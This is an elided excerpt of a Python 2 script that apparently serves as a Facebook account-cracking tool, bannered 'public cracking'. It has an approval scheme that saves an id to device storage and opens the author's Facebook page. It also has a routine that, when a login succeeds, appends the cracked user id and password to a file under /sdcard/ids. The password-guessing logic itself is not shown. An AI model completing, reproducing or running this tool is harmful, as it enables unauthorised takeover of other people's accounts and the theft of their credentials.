...
def reg():
    ...
    if to in r:
        ...
        os.system('clear')
        print logo
        print '\tApproved Successful'
        print ' \x1b[1;92mYour Id Is Approved Already '
        print ' \x1b[1;92mfollow the admin and press enter back check the approvel'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Your Id is approved successful')
...
def reg2():
    ...
    print ' \x1b[1;92mFollow the admin and press enter back to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to Facebook ')
    os.system('xdg-open https://www.facebook.com/programmer320')
    sav = open('/sdcard/.id.txt', 'w')
    sav.write(id)
    sav.close()
...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Abid Hussain public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                ok = open('/sdcard/ids/shadow_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
